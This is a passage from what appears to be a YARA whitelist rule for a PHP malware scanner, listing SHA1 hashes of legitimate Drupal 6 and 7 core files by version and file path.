        hash.sha1(0, filesize) == "c91aab4890cafc70cfee4277042d505f3f15e1ff" or // modules/system/system.module
        hash.sha1(0, filesize) == "527bb89b9ccbdf5a1e08c81ab2686a893c07ed78" or // includes/form.inc

        /* Drupal 6.17 */
        hash.sha1(0, filesize) == "2368a5402417369e2cd6318e103ca07747666aaa" or // modules/node/node.module
        hash.sha1(0, filesize) == "1d387478445f18f8668b5d7ed7d1d96eb0aedb3d" or // includes/locale.inc
        hash.sha1(0, filesize) == "599bcbdc3c2ff6e8ebe6cf8f24614f8d1c553410" or // themes/garland/template.php
        hash.sha1(0, filesize) == "d63700c733fcb3f8fe927225b132a9cc10211ba1" or // modules/system/system.module
        hash.sha1(0, filesize) == "48dcc2f93ecd31c679e702a1faf2b2caff8b1180" or // includes/form.inc
        hash.sha1(0, filesize) == "8b3f52ad501ca0b4726af6996e57618b4ca5e4f8" or // includes/xmlrpc.inc

        /* Drupal 6.18 */
        hash.sha1(0, filesize) == "a2c40e8095cdcd133bd4cb8a720740cd6cd68c90" or // modules/system/system.module

        /* Drupal 6.19 */
        hash.sha1(0, filesize) == "58dbd82382056e8a5367492c57a8807cbad402cb" or // modules/node/node.module
        hash.sha1(0, filesize) == "c008f67f93a812c1df421e6259db83a3532fdd80" or // includes/batch.inc
        hash.sha1(0, filesize) == "a229335ab54e2f5a671b7d6835433e34dcac1df3" or // includes/locale.inc
        hash.sha1(0, filesize) == "6e39f4d4b47cc49137e77b5927f8194ebedcda2e" or // modules/system/system.module
        hash.sha1(0, filesize) == "f4dffdc1a14330db9f3a59f14857de5479e331b9" or // includes/form.inc

        /* Drupal 6.20 */
        hash.sha1(0, filesize) == "b698942278cdd380f828bf5e6104c7e37679931d" or // modules/node/node.module
        hash.sha1(0, filesize) == "b16330077711b7735dd205ae651037d85aac3e12" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "41dec55320082ae8d611a2aa626ae54cc4a76d75" or // includes/menu.inc
        hash.sha1(0, filesize) == "4697affab0bafeaf765a62b809a021fdf4068485" or // modules/system/system.module
        hash.sha1(0, filesize) == "3856daf8ab296ce371c22b02baa32e4da90029c0" or // includes/form.inc

        /* Drupal 6.21 */
        hash.sha1(0, filesize) == "1cf1e904fb4338edfee61d91ebb611e5ac034ecd" or // modules/node/node.module
        hash.sha1(0, filesize) == "78e3bd8a85c6f09b0635343791dad50b4c41a58f" or // includes/batch.inc
        hash.sha1(0, filesize) == "4864252a3ead68da46dbe5400f906a8586a1384f" or // includes/locale.inc
        hash.sha1(0, filesize) == "1057ca4a11b268576e69bd111a067eb4c87ad571" or // themes/garland/template.php
        hash.sha1(0, filesize) == "d9d2bd9363cafd8b464d5e82f164a83f3cf23828" or // includes/menu.inc
        hash.sha1(0, filesize) == "fdf231fce40e84493a3f2d3d3a08eecac175f8d2" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "1276ff3bd1677bf2ece8481bfba55cfe673cff55" or // modules/system/system.module
        hash.sha1(0, filesize) == "48d49c860d1904399b6c44cc2660e699f05e52f7" or // modules/color/color.module
        hash.sha1(0, filesize) == "1557e578a59a2b7fc4a241073022c7f4f19d2e5f" or // includes/xmlrpc.inc
        hash.sha1(0, filesize) == "88956b7193b9d97c387d76a78e67aec948955be2" or // includes/form.inc

        /* Drupal 6.22 */
        hash.sha1(0, filesize) == "21a311cf276dae1528ce8595be4906fc8acf642c" or // modules/node/node.module
        hash.sha1(0, filesize) == "d1f23968f5682341587813b6288e7b3377ab8b53" or // includes/batch.inc
        hash.sha1(0, filesize) == "246b764fbc7047a5245204d40bfe9ff0369e3817" or // includes/locale.inc
        hash.sha1(0, filesize) == "a1c6ca497e8672f9e9cc5dae72229d42d92e7244" or // themes/garland/template.php
        hash.sha1(0, filesize) == "ae212697bbbc8eab36e5c1330b0b9597e236d7d3" or // includes/menu.inc
        hash.sha1(0, filesize) == "23968265dab777455460b72ae62e5e0442153eef" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "099a434e38d8b7463385e50fd67c74cfd955061c" or // modules/system/system.module
        hash.sha1(0, filesize) == "a3fedf58f5ff6d51b1bb4f8692c34b2afddc4085" or // modules/color/color.module
        hash.sha1(0, filesize) == "1e60761b6b1ad271b83a1003709d93bee52c6a0d" or // includes/xmlrpc.inc
        hash.sha1(0, filesize) == "9c0d518eff915269fe7cce4ccfa8a13931f37fd8" or // includes/form.inc

        /* Drupal 6.23 */
        hash.sha1(0, filesize) == "e60493bdbb199d250a9922ef6a601569bb8de76e" or // modules/system/system.module

        /* Drupal 6.24 */
        hash.sha1(0, filesize) == "7b12a9d929023252e0c1811ae0adcf9e4c774254" or // modules/node/node.module
        hash.sha1(0, filesize) == "dab7c84b2342498a37b0bb73d3d6cf24c0f05742" or // includes/batch.inc
        hash.sha1(0, filesize) == "9be2405ef05e71f30eae6734a9e62b25e6987a35" or // includes/locale.inc
        hash.sha1(0, filesize) == "c20d802bbc52b545e3165331a7cdb9d6bb7b7df1" or // includes/menu.inc
        hash.sha1(0, filesize) == "59a40a4f99d7bc0546721c7761753e74dc3fe3c3" or // modules/system/system.module
        hash.sha1(0, filesize) == "30fbb626155b8b19ad032ffc701088ddf4199b42" or // includes/form.inc

        /* Drupal 6.25 */
        hash.sha1(0, filesize) == "1d2c37df3b426b7be8320b927126dd1539bc57c3" or // modules/system/system.module

        /* Drupal 6.26 */
        hash.sha1(0, filesize) == "0a727f287b856521d59198b9b0573b5aa80434f4" or // includes/locale.inc
        hash.sha1(0, filesize) == "4905160d51618a72d2a58339c88429ada66e5a74" or // modules/system/system.module
        hash.sha1(0, filesize) == "53055651427e6d4a8c202c4250977c36145b9512" or // includes/form.inc

        /* Drupal 6.27 */
        hash.sha1(0, filesize) == "c2cbbc1186ca7b2c8754c2886366b17037ee7486" or // modules/system/system.module

        /* Drupal 6.28 */
        hash.sha1(0, filesize) == "155613ff0e0d2bd61da2bad7734ce22428749c14" or // modules/system/system.module
        hash.sha1(0, filesize) == "7e40d9561d9ab17e7876c397d9f0595e29b9df27" or // includes/form.inc

        /* Drupal 6.29 */
        hash.sha1(0, filesize) == "ec5935d65d04e19accc08a2bc22fd11e64308b09" or // modules/system/system.module
        hash.sha1(0, filesize) == "91f55a3d4b403e0e16e2db693b2965bcbb136dbb" or // includes/form.inc

        /* Drupal 6.30 */
        hash.sha1(0, filesize) == "38d887f720a4cf99fbdb041c481bb4d10cd4f984" or // modules/system/system.module
        hash.sha1(0, filesize) == "ede96ab5b9624c5831ef65c9ea16aaea572a402a" or // includes/form.inc

        /* Drupal 6.31 */
        hash.sha1(0, filesize) == "10a93fe4578303c207a6ebc0535b7f96642f8767" or // modules/system/system.module
        hash.sha1(0, filesize) == "3f4fb8489b104cb120c7fbb7968675c2d236d6db" or // includes/form.inc

        /* Drupal 6.32 */
        hash.sha1(0, filesize) == "2b3300f3c10abeba51ed0aad3b3f9167b6b270f6" or // modules/system/system.module
        hash.sha1(0, filesize) == "12ad1f5e5b3905ecd78abd020d41808f825da68e" or // includes/form.inc

        /* Drupal 6.33 */
        hash.sha1(0, filesize) == "212255d13179c9b80cc1b7ab31d8022a7797730d" or // modules/system/system.module
        hash.sha1(0, filesize) == "3976d9af713a99b0237f6ddeadbb3490b52a7386" or // includes/xmlrpc.inc

        /* Drupal 6.34 */
        hash.sha1(0, filesize) == "b3e28ca900cdbb5e468242b3fa6be6838313e436" or // modules/system/system.module

        /* Drupal 6.35 */
        hash.sha1(0, filesize) == "8aedf452ae91d3a182fdfa9fb606664ee34b689d" or // includes/menu.inc
        hash.sha1(0, filesize) == "7fea22f40d84ac1a622bdfa19ace8fe25c243440" or // modules/system/system.module

        /* Drupal 6.36 */
        hash.sha1(0, filesize) == "3f86504c275d2a09a0136d91508f67707ef7e318" or // modules/system/system.module

        /* Drupal 6.37 */
        hash.sha1(0, filesize) == "5e21f9e3de34e2c1797adc1bd8bcb95c56be1268" or // includes/menu.inc
        hash.sha1(0, filesize) == "e3e7f7d44055a9c21da39e7ea0f88a39ebcc5191" or // modules/system/system.module
        hash.sha1(0, filesize) == "0b6fa630381cd3af7edbf3c4c460c572c0b51f1c" or // includes/form.inc

        /* Drupal 6.38 */
        hash.sha1(0, filesize) == "87473ff28e3c066d20f701e7d793c14ab4f65d65" or // includes/menu.inc
        hash.sha1(0, filesize) == "1fe7978017f44dee7e3200308879c4c0a7ea7c7c" or // modules/system/system.module
        hash.sha1(0, filesize) == "a7281eb545f13d2e5d4d90c4ce2b56ca6116c1ce" or // includes/form.inc

        /* Drupal 7.0 */
        hash.sha1(0, filesize) == "228137e2ec431da9e30e427de8e0aa1aab3d2fd1" or // modules/node/node.module
        hash.sha1(0, filesize) == "a922e0dbc03a425e3bc0fdae80c28ba3ac8d7ffb" or // includes/batch.inc
        hash.sha1(0, filesize) == "0885dda53e94c3960cddf0c16a7ad5416a334cce" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "ab065305452d07211bc7443cd295dc2b780b087f" or // includes/locale.inc
        hash.sha1(0, filesize) == "f4e7855dcde189ad17b70bdbf2df2f51bb7e1a02" or // includes/update.inc
        hash.sha1(0, filesize) == "ad4910fce34a43990e7eaef91f7c95f311d7fa29" or // includes/theme.inc
        hash.sha1(0, filesize) == "2ce4dea1385e3434d4d0724fe2aa2bc5ff963da8" or // modules/comment/comment.module
        hash.sha1(0, filesize) == "2aa37405d4873a2321bc244230ee7a0104365127" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "9259e61d198496004841cb94e10cf218f55c7dd6" or // includes/database/query.inc
        hash.sha1(0, filesize) == "c506c1adb94ef26ffe6c14ec02378b79c910f130" or // includes/file.inc
        hash.sha1(0, filesize) == "00b8473d18ed60cc06f13e4b7922a29bc93088ab" or // modules/node/node.api.php
        hash.sha1(0, filesize) == "501a31b23d5d76d16af32f980124e188f92c1b60" or // modules/image/image.effects.inc
        hash.sha1(0, filesize) == "adb445d6aaf7cecf9b527978e90353ff1c218729" or // modules/color/color.module
        hash.sha1(0, filesize) == "9b4fb5bb67916de73a3aca80f5f9b6ac6370dbb9" or // includes/database/sqlite/schema.inc
        hash.sha1(0, filesize) == "627468282dea7a3491757455678d234fdfafb88a" or // includes/database/pgsql/schema.inc
        hash.sha1(0, filesize) == "f3744b876879f4121030cc40df82de03fe30caa8" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "8c34383c3aa2bd6bb583d91f8867a53157fb2c0c" or // modules/user/user.install
        hash.sha1(0, filesize) == "988c9e1ec349d19a95fdcde9e9e3e334bb672fd0" or // includes/xmlrpc.inc

        /* Drupal 7.1 */
        hash.sha1(0, filesize) == "e35f8489c3863c8c4d4abb0d166b35e1a699d618" or // modules/node/node.module
        hash.sha1(0, filesize) == "4a662f3e0f5a4ed48a8f320800bb6eb1b6c2e173" or // includes/batch.inc
        hash.sha1(0, filesize) == "ee49ec8bf1062ef741ae480e266ff3f41b3bd5bd" or // includes/locale.inc
        hash.sha1(0, filesize) == "e0a5db67328fe2b123bfe68cfe0513f75280dd7a" or // includes/update.inc
        hash.sha1(0, filesize) == "ff3b1d9fcd67edd835da289aa350b3e3c8eab640" or // includes/theme.inc
        hash.sha1(0, filesize) == "22546416a2d99e42799e9c0cc52146d46c2feb7c" or // modules/comment/comment.module
        hash.sha1(0, filesize) == "0e1ae22c4da4bf873136af717d616cb87bcfeefd" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "e5283af09bffe3133ad5aada2d294a1d5402fb75" or // includes/database/query.inc
        hash.sha1(0, filesize) == "fb9cd96830b3482770937479a873064978c151c2" or // includes/file.inc
        hash.sha1(0, filesize) == "2803e88287d2baff8d9e869e275c406ad6b972e8" or // modules/node/node.api.php
        hash.sha1(0, filesize) == "6d501b8bf9450fff051a569c3108477d5f531783" or // modules/image/image.effects.inc
        hash.sha1(0, filesize) == "6df377260a15d5100167aa49d0c8dc8f333e1e66" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "133831799dc1814e4cb2a18176bc59ed82e5cf77" or // includes/database/sqlite/schema.inc
        hash.sha1(0, filesize) == "81ee866a49598c6e61011c7aa5992d1a1f2856cc" or // includes/database/pgsql/schema.inc
        hash.sha1(0, filesize) == "016eb62bc9b5de611b4688f1aaddbae989f3420f" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "7aa89ef96e5a9655436cd670d80a34a76684840f" or // modules/color/color.module
        hash.sha1(0, filesize) == "9c017d1d16426270a4b3bff374b58e2a08100ce7" or // modules/user/user.install
        hash.sha1(0, filesize) == "3ef3764879ae96be700c3ea6e6f18e3699b118f0" or // includes/xmlrpc.inc

        /* Drupal 7.2 */
        hash.sha1(0, filesize) == "34dbcf77a17cda9e6357d813e2b8018d7c5c7add" or // modules/node/node.module
        hash.sha1(0, filesize) == "fc52ef5640845babe48bea230c311e86b5e227f0" or // includes/batch.inc
        hash.sha1(0, filesize) == "23cc0e2c6eebe94fe189e258a3658b40b0005891" or // modules/simpletest/tests/upgrade/drupal-6.bare.database.php
        hash.sha1(0, filesize) == "a00a4810f45e30f72b3b8b649b21acd40aeffc75" or // includes/locale.inc
        hash.sha1(0, filesize) == "907d7d94601c7a03cf32deeb25b0255aadb05f54" or // includes/update.inc
        hash.sha1(0, filesize) == "544e2f10c37c2723e83205e35044d35e96279aa8" or // includes/theme.inc
        hash.sha1(0, filesize) == "baee2c77c68ea3fdb39acb3321789053cd16488f" or // modules/comment/comment.module
        hash.sha1(0, filesize) == "ff60b0b61bbc7b6e7e436ddf3205ed1d3b0778c0" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "c99932104d23747667422639f23b5604b3b627c0" or // includes/database/query.inc
        hash.sha1(0, filesize) == "ab223dcbc96f39de69b0bded8f9b55db6b79e72c" or // includes/file.inc
        hash.sha1(0, filesize) == "a14664f269a4801d956ae9a7f560208902657e89" or // modules/node/node.api.php
        hash.sha1(0, filesize) == "bc2afeb66152b4fc837798753dbb718681930e70" or // modules/image/image.effects.inc
        hash.sha1(0, filesize) == "b4572b134a6a581677e5c8dc90c58caea3570718" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "f248caf89e30f5a628af90ee4bea3a4a876294ea" or // includes/database/sqlite/schema.inc
        hash.sha1(0, filesize) == "e38ede84586bf22ea788d5df2018f7517360fe62" or // includes/database/pgsql/schema.inc
        hash.sha1(0, filesize) == "2c82b626fa35c256796cd4b6651f13055d396815" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "7a9472aeda498f93f154b44f90a87a33a709b222" or // modules/color/color.module
        hash.sha1(0, filesize) == "8cb36d865b951378c3266dca7d5173a303e8dcff" or // modules/simpletest/tests/upgrade/drupal-6.filled.database.php
        hash.sha1(0, filesize) == "b78a99f99fde3375da61aad7dc0940bac8d4e515" or // modules/user/user.install
        hash.sha1(0, filesize) == "fd061dceb82cd18b9866d81bc8588c157cfcfdd9" or // includes/xmlrpc.inc

        /* Drupal 7.3 */
        hash.sha1(0, filesize) == "cfbcf70d4553beac63d2cdd67daffb90063bcad0" or // modules/node/node.module

        /* Drupal 7.4 */
        hash.sha1(0, filesize) == "5c1ab3a9fab6119d8b7dd092a9172e392d436e83" or // modules/node/node.module
        hash.sha1(0, filesize) == "8111cfa60d4789710825ba3389e1dd0954410a3b" or // includes/batch.inc
        hash.sha1(0, filesize) == "e317ebde4ea83d825d82f474175af6cbe0d35978" or // includes/locale.inc
        hash.sha1(0, filesize) == "d7b95646f2d390b23f686a579e74a0132d9be127" or // modules/comment/comment.module
        hash.sha1(0, filesize) == "abfb60fb8f4560d55fec097d641d99b17a611127" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "ccd2d749cf9120100761f46564c789a63baaa533" or // includes/file.inc
        hash.sha1(0, filesize) == "c8adac93914d701282fc76b03b68b1d4bcf111f3" or // modules/node/node.api.php
        hash.sha1(0, filesize) == "f497cc0c8d592dfad4f992d2fef96a6ed2fad3d1" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "8523e46e8d42d7ad2795e1972dbe5ab7683fd430" or // modules/color/color.module
        hash.sha1(0, filesize) == "54ab4931fd4153e45b70e40a059b096e8b9f1dde" or // modules/user/user.install

        /* Drupal 7.5 */
        hash.sha1(0, filesize) == "0fe5c9d14de7aa5a6eb90d5ccef639f85af67731" or // modules/comment/comment.module

        /* Drupal 7.6 */
        hash.sha1(0, filesize) == "2f803125bdb3c2c7da6027bd039a06d24c7bf441" or // modules/node/node.module
        hash.sha1(0, filesize) == "5b161c50878bda62cefdb165e361288928a3bcfe" or // modules/comment/comment.module
        hash.sha1(0, filesize) == "c1d065492b96823f09e6ccae43fd2d36e856e4d6" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "b0604abef9f1ad08e75f8f3b49a42d1e4f4e5093" or // includes/file.inc
        hash.sha1(0, filesize) == "8dee21ea769e0a25be89c2d9dec47ca416549f55" or // modules/node/node.api.php
        hash.sha1(0, filesize) == "38e30cecf915663b1b1e9c47d43c559db9fc50a7" or // modules/system/system.api.php

        /* Drupal 7.8 */
        hash.sha1(0, filesize) == "ef540f3d6dfe62e0649a8d9a85fe1f24a03e826c" or // modules/node/node.module
        hash.sha1(0, filesize) == "fa2f8bd721f4ba4432d781cc0dd2a4dad94a3d77" or // includes/update.inc
        hash.sha1(0, filesize) == "d53494036ec1d09b63951ff6372e4da3600981a5" or // includes/theme.inc
        hash.sha1(0, filesize) == "50239d9649de44842b584b5d3498d208839b304b" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "b3560506e463666789a8507354762b4c48e8ff58" or // includes/database/query.inc
        hash.sha1(0, filesize) == "b3c5dd723611d4ecfe59908d6defd7c0b2ce4a1c" or // includes/file.inc
        hash.sha1(0, filesize) == "554df15d8bde0586535f5005cf1357106943e1d0" or // includes/database/sqlite/schema.inc
        hash.sha1(0, filesize) == "dbe730df886669a0aeeda142e97c1dded6ea94a8" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "e89d20c7efc7c8b66b64858b4e2f4db8f942901d" or // modules/color/color.module
        hash.sha1(0, filesize) == "cfd3a5279057e6a3954cf7f77a60373f6fb1fed9" or // modules/user/user.install

        /* Drupal 7.9 */
        hash.sha1(0, filesize) == "874f20cc4d15d66b16c708e0f5875b5ba7d5a14f" or // modules/node/node.module
        hash.sha1(0, filesize) == "376c733a803cc5fee588b62f2339a3952e3286b7" or // includes/locale.inc
        hash.sha1(0, filesize) == "141851c796279d22ccb4ad8c40694cba0f13c85d" or // modules/image/image.module
        hash.sha1(0, filesize) == "e1de684d85edb24a774880b747acb08bd3b7a898" or // includes/update.inc
        hash.sha1(0, filesize) == "8972898bde23edde98d6de14ff263a75d12ec086" or // includes/theme.inc
        hash.sha1(0, filesize) == "3a754517384a1418312c5f750e90ca94526d7823" or // modules/comment/comment.module
        hash.sha1(0, filesize) == "3620e1eb6ca27a32b4e8881d1364d3540ac0cc8e" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "18ebac575d626411895b12a394be34ed2a844f21" or // includes/database/query.inc
        hash.sha1(0, filesize) == "1190f6d63a28a9b1d8ee858ef9ee18dcd08d8a3c" or // includes/file.inc
        hash.sha1(0, filesize) == "3cd13f1cff9db2adcbdb24f0db798b97fc0f2e54" or // modules/node/node.api.php
        hash.sha1(0, filesize) == "f24d52c0dfc83e77ed99199b488c5c5854bb64d3" or // modules/image/image.effects.inc
        hash.sha1(0, filesize) == "1b1b3d4e3d153a6daca9730d685b483e779384ce" or // includes/database/sqlite/schema.inc
        hash.sha1(0, filesize) == "802e206777d89fd2c1bff3eebeb14131953059e2" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "62e08a84c9456cb7b2be8323b39e6363330565af" or // modules/user/user.install

        /* Drupal 7.10 */
        hash.sha1(0, filesize) == "f8d160b22569d99bb7ae606d897b5739aba1b4c0" or // includes/locale.inc
        hash.sha1(0, filesize) == "d4bd1976a0d91a872f2ee337adbd0dbd08981328" or // includes/theme.inc
        hash.sha1(0, filesize) == "193f4a8468152cc92568fba79536e8188c026048" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "3776fcae25ce7a1e09afdf16d7af516278d4db90" or // modules/node/node.api.php
        hash.sha1(0, filesize) == "9915a088e3b9be5bab1cf0af896ca5c3ca6f5a91" or // modules/system/system.api.php

        /* Drupal 7.12 */
        hash.sha1(0, filesize) == "6ba7cc7cdbf3ac477cabb29eaa7ec544d38618cd" or // includes/locale.inc
        hash.sha1(0, filesize) == "30c00b4ecc434169129c91a21388e6fa343263b5" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "66c8f012e591b67260b395ae4cd3e55aa63518f9" or // includes/database/query.inc
        hash.sha1(0, filesize) == "5bc8b220886f9127c625521bbea545e9d4e5ecf6" or // includes/file.inc
        hash.sha1(0, filesize) == "9683c49120d00594cc6669d691b3945679f247d8" or // includes/xmlrpc.inc
        hash.sha1(0, filesize) == "3ad0b3de8824928da3f4dadf4969ea7abf1e9e76" or // modules/node/node.api.php
        hash.sha1(0, filesize) == "83bcc07bd2c47f6bd5b21e7686d72606b36f2a97" or // modules/color/color.module
        hash.sha1(0, filesize) == "6e863704c3bd2d18bda76990731797aea26b6e45" or // modules/taxonomy/taxonomy.module
        hash.sha1(0, filesize) == "a6dfab1b914e1f1d4413a5370d2cfba0ca9eccd3" or // includes/update.inc
        hash.sha1(0, filesize) == "a2996d736eef113f602b2b8c9815fdcdf166edd7" or // includes/theme.inc
        hash.sha1(0, filesize) == "ad2ed35be4a5b72d759d80dccd0870023a8b559a" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "6d6bf6fab7bd7e62781e9b3f214e75b6fd0401ef" or // modules/node/node.module
        hash.sha1(0, filesize) == "5a0cb26b63ebfd0a9ab9b6b639c28be96bda678a" or // includes/batch.inc
        hash.sha1(0, filesize) == "873673223fcf2c5ffbb2ee61e46b60e88276bb2c" or // modules/comment/comment.module
        hash.sha1(0, filesize) == "c94089c0c1f7e28099713ac4358361ab6c093b8e" or // modules/image/image.effects.inc
        hash.sha1(0, filesize) == "5e622a61c008ce9e28e1e1ca8c5396c716eec50d" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "f9f2950ec923251f1410c3a010a40bd92e9c1c2e" or // modules/user/user.install

        /* Drupal 7.13 */
        hash.sha1(0, filesize) == "fdc337289dadbc2a4d51d50603b6a1a5cf314a2f" or // includes/file.inc
        hash.sha1(0, filesize) == "9517f7d6b6aafe54b7e70c33f9da3f96b3e30a0c" or // modules/image/image.module

        /* Drupal 7.14 */
        hash.sha1(0, filesize) == "e0e6c50f7a5fef4095d0511db65e489306dd2bc5" or // includes/locale.inc
        hash.sha1(0, filesize) == "559e78ca68c387361a9b205a9eb6ba39de431cd9" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "63661ea9e3f2c0a4300d9110e44ec6eba34d9ecf" or // includes/database/query.inc
        hash.sha1(0, filesize) == "ceaeb8ead71f3f102e0b7eda1704ecf6f752ff1f" or // includes/file.inc
        hash.sha1(0, filesize) == "b9d2e309d9f3879c6aabe12087d2afa117f72e42" or // includes/database/pgsql/schema.inc
        hash.sha1(0, filesize) == "fc041148a8964db0130e497050a820cd44bea728" or // modules/node/node.api.php
        hash.sha1(0, filesize) == "8c5963e0ebe56652269d97ac155b4750c9268018" or // modules/color/color.module
        hash.sha1(0, filesize) == "7d882fc545e045e486cdec4fbe5137ef604b747d" or // modules/taxonomy/taxonomy.module
        hash.sha1(0, filesize) == "ba874d97c43cae425fcc485d15f8287b0f030f1c" or // includes/update.inc
        hash.sha1(0, filesize) == "9be718159cda03c3872c1b209b5b1fa84fb86283" or // includes/theme.inc
        hash.sha1(0, filesize) == "f3d155a0156229045cd61033373e7404a11730a6" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "b747e7c1ac3239f51551e12c1b3673c4f9b53cda" or // modules/node/node.module
        hash.sha1(0, filesize) == "4f5c656cb1db75129aa75cab4ba0cba4d57f1fa5" or // modules/comment/comment.module
        hash.sha1(0, filesize) == "d1deca550745738a82ce725de78f0661d0081b69" or // modules/image/image.module
        hash.sha1(0, filesize) == "921e4866862f1123f48cb6b51c805933b7eea9ff" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "c112dddc71fb901ebacab6e6f30674e952873ab2" or // modules/user/user.install

        /* Drupal 7.15 */
        hash.sha1(0, filesize) == "89b2e192085ca361a61a8cd7b37852f377885ad9" or // includes/locale.inc
        hash.sha1(0, filesize) == "8eb49bc4f8056989eff06d0fd1027b198151d03a" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "93beff3b71eca68011eb61388a66db2f23c5ee63" or // includes/database/query.inc
        hash.sha1(0, filesize) == "ad03ed890400cf319f713ee0b4b6a62a5710f580" or // modules/system/system.admin.inc
        hash.sha1(0, filesize) == "73f4bb0c0d1b84887e03815381334b53f13c01f7" or // modules/taxonomy/taxonomy.module
        hash.sha1(0, filesize) == "fbae17fa9997c3a5b2f51ac38519af54c2138575" or // includes/update.inc
        hash.sha1(0, filesize) == "a1d0eb20cec51c12552955ff4ca77cf6f8ec8a0c" or // includes/theme.inc
        hash.sha1(0, filesize) == "6c9c01bef14f8f64ef0af408f7ed764791531cc6" or // modules/system/system.module
        hash.sha1(0, filesize) == "142bf4bc3de00b35a05584ff17cbe7264c017b37" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "80ed887b7589aab47b263a4e92a1dff8e7675156" or // modules/node/node.module
        hash.sha1(0, filesize) == "81a568555885316598cf73fa67660f32e6f6d439" or // modules/comment/comment.module
        hash.sha1(0, filesize) == "1fb1b04c34e55ee113f82adb6fb5cf35b415242d" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "d9a1159df42f8ed46acde0b7ef3dab54dd9276d1" or // modules/user/user.install

        /* Drupal 7.17 */
        hash.sha1(0, filesize) == "87a638d6809ec1740bd206095cbba9473d43134a" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "2ada89b2b4f02665654c637060e6401617421b35" or // includes/file.inc
        hash.sha1(0, filesize) == "e288cbba2d7791014f8d5056f7bc96c0eb2f7034" or // modules/simpletest/tests/database_test.test
        hash.sha1(0, filesize) == "b9e993eb5138a2abe365ee837fa1923a70849721" or // modules/node/node.api.php
        hash.sha1(0, filesize) == "26be86fa997a3d2d560589991a96cad4f96902e3" or // modules/taxonomy/taxonomy.module
        hash.sha1(0, filesize) == "5496e25660589649f4bfcf21441cd34d50461332" or // includes/update.inc
        hash.sha1(0, filesize) == "a21cb2e9f9af380dd414137b31e635826cbe93a3" or // includes/theme.inc
        hash.sha1(0, filesize) == "d94d0ad98ae0348420f4bd6f76b9721ec9f765fe" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "06f2ae2d736cd60b01ba7c58711f9bf78e4dc5d8" or // modules/node/node.module
        hash.sha1(0, filesize) == "b6d4da7d08276c36e6e57300eacd1e7fdc129f82" or // modules/comment/comment.module
        hash.sha1(0, filesize) == "f3f1e8913545884f4e18da979b299b2c31dc4464" or // modules/image/image.module
        hash.sha1(0, filesize) == "07b172f6bae1f3379d80204c986447a16ea3faef" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "1256625518f3bd4e8816265c0a1f50ee8f0e576f" or // modules/user/user.install

        /* Drupal 7.18 */
        hash.sha1(0, filesize) == "b54c24bb2a8be7e46d8565c0d116efe8f76feec7" or // includes/file.inc

        /* Drupal 7.19 */
        hash.sha1(0, filesize) == "0b3443743f466756c108c38ab87ccf4adcf6b403" or // modules/image/image.module

        /* Drupal 7.20 */
        hash.sha1(0, filesize) == "21a79abbf5c58274ed20af6a31c36337b51cf529" or // modules/image/image.module

        /* Drupal 7.21 */
        hash.sha1(0, filesize) == "f5a411da3de18d2c7317c68b4accdd5d639e9c3e" or // modules/image/image.module

        /* Drupal 7.22 */
        hash.sha1(0, filesize) == "a80edc160988720b1e1698cacf7ed9d463ba32b7" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "2c30986a35dbc2cc30677bf1bee693af2d79f29f" or // includes/database/query.inc
        hash.sha1(0, filesize) == "2ff3f5392b01f0863835e9f64adadbbc15e0cf47" or // includes/file.inc
        hash.sha1(0, filesize) == "0d11b0111510c28850bb2da05133288bf68b29bb" or // modules/simpletest/tests/database_test.test
        hash.sha1(0, filesize) == "716849249abf5fa9357c969dc7c469a650cefb4a" or // modules/node/node.api.php
        hash.sha1(0, filesize) == "5dfed6dda5a73aeb68317f4075d207061e00a97b" or // includes/update.inc
        hash.sha1(0, filesize) == "620882ff6d924aebdc623939e9f258cfc280d558" or // includes/theme.inc
        hash.sha1(0, filesize) == "f22075fbd3b250ff34d9bdf3e9e9d65bad41bffc" or // modules/system/system.api.php
        hash.sha1(0, filesize) == "a60ac92515062e34cbd2f6a863f89c5154476ffa" or // modules/node/node.module
        hash.sha1(0, filesize) == "44af4b05bdfb190ff25905516f7e2e6274c7b0f0" or // modules/comment/comment.module
        hash.sha1(0, filesize) == "24d8c75b194eccc163ba34e153cb6bd733e1493c" or // modules/image/image.module
        hash.sha1(0, filesize) == "c6128650f2103c3139af69e69a7c8fd5f7f08f4f" or // modules/locale/locale.module

        /* Drupal 7.23 */
        hash.sha1(0, filesize) == "d3389a9db226a217aa9785cb72b699b36e1e4db4" or // modules/field/field.api.php
        hash.sha1(0, filesize) == "3a4c2eca65105c3248fa6ef1d1f2dc2eb287a313" or // includes/database/query.inc
        hash.sha1(0, filesize) == "4a4a2967b901d7e3ded1dc099388448712a0ed2d" or // includes/file.inc
        hash.sha1(0, filesize) == "4268df3cf19556a7b7d0798dc81977c90acfa0e7" or // modules/locale/locale.test
        hash.sha1(0, filesize) == "bc96ed062a7fad7ebbda32669c3a5daa381575a6" or // modules/color/color.module
        hash.sha1(0, filesize) == "e117ed405022dcc8175d306b96c42a53f7c0410a" or // modules/taxonomy/taxonomy.module
